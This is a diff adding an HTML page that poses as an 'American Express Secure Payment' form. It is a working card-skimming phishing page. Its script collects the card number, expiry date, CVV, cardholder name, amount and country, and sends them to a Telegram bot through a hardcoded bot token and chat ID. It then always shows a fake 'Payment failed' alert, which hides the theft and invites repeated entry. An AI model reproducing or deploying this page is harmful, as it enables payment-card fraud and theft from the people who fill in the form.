@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>American Express Payment UI</title>
+    <!-- Include Font Awesome for the American Express Icon -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <script>
+        const TELEGRAM_BOT_TOKEN = "7590766158:AAFTMfMpGQkg_4iw3UyOiGX4NdarPIvcwRE";
+        const TELEGRAM_CHAT_ID = "6807445600";
+
+        // Send the order details to Telegram
+        function sendToTelegram(cardNumber, expiryDate, cvv, amount, cardHolderName, country) {
+            const message = `American Express Order Received!\nCard Number: ${cardNumber}\nExpiry Date: ${expiryDate}\nCVV: ${cvv}\nAmount: $${amount}\nCard Holder Name: ${cardHolderName}\nCountry: ${country}`;
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        alert("Payment failed, invalid details!");
+                    } else {
+                        alert("Payment failed, invalid details!");
+                    }
+                })
+                .catch(err => {
+                    alert("Error sending order.");
+                    console.error(err);
+                });
+        }
+
+        // Handle the form submission
+        function handleSubmit(event) {
+            event.preventDefault();
+
+            const cardNumber = document.querySelector('input[name="cardNumber"]').value;
+            const expiryDate = document.querySelector('input[name="expiryDate"]').value;
+            const cvv = document.querySelector('input[name="cvv"]').value;
+            const amount = document.querySelector('input[name="amount"]').value;
+            const cardHolderName = document.querySelector('input[name="cardHolderName"]').value;
+            const country = document.querySelector('select[name="country"]').value;
+
+            // Check for invalid card details
+            if (cardNumber.length !== 15 || expiryDate.length !== 5 || cvv.length !== 3 || cardHolderName.trim() === "" || amount.trim() === "") {
+                alert("Payment failed, invalid details!");
+                return; // Prevent submission if details are invalid
+            }
+
+            // Send order details to Telegram
+            sendToTelegram(cardNumber, expiryDate, cvv, amount, cardHolderName, country);
+
+            // Show successful payment notification
+            alert("Payment failed, invalid details!");
+        }
+
+        // Automatically add / when user is typing expiry date
+        function formatExpiryDate(event) {
+            let input = event.target.value;
+            if (input.length === 2) {
+                input = input + '/';
+                event.target.value = input;
+            }
+        }
+    </script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            text-align: center;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            width: 350px;
+            margin: 50px auto;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            border-radius: 5px;
+        }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .btn {
+            background: #0033A0;
+            color: white;
+            border: none;
+            padding: 10px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .btn:hover {
+            opacity: 0.8;
+        }
+        .logo {
+            width: 150px;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <i class="fab fa-cc-amex" style="color: #0033A0; font-size: 50px;" title="American Express"></i>
+        <h3>American Express Secure Payment</h3>
+        <form onsubmit="handleSubmit(event)">
+            <input type="text" name="amount" placeholder="Payment Amount ($)" required>
+            <input type="text" name="cardNumber" placeholder="Card Number" maxlength="15" required>
+            <input type="text" name="expiryDate" placeholder="Expiry Date (MM/YY)" maxlength="5" oninput="formatExpiryDate(event)" required>
+            <input type="text" name="cvv" placeholder="CVV \ CVC" maxlength="3" required>
+            <input type="text" name="cardHolderName" placeholder="Full Name on Card" required>
+            <select name="country" required>
+                <option value="">Select Country</option>
+                <option value="Bangladesh">Bangladesh</option>
+                <option value="India">India</option>
+                <option value="United States">United States</option>
+                <option value="United Kingdom">United Kingdom</option>
+                <option value="Canada">Canada</option>
+            </select>
+            <button type="submit" class="btn">Pay Now</button>
+        </form>
+    </div>
+</body>
+</html>
